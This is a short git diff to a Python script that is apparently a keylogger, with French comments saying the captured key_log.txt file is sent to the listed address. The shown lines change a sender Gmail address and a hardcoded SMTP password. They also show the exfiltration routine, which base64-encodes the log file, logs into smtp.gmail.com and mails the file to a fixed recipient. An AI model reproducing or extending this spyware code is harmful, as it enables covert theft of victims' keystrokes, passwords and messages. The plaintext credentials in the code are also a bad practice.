@@ -7,7 +7,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 
 #Initialisation 
-fromaddr = "keylogger13130@gmail.com"
+fromaddr = "keylogger.projet@gmail.com"
 
 #Adresse email dest :vous allez recevoir le fichier key_log.txt sur cet email
 toaddr = "fichiertext@gmail.com"
@@ -37,7 +37,7 @@ def envoi():
         encoders.encode_base64(part)
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
-        server.login(fromaddr, "python1m")
+        server.login(fromaddr, "pythonm1")
         text = msg.as_string()
         server.sendmail(fromaddr, toaddr, text)
         server.quit()
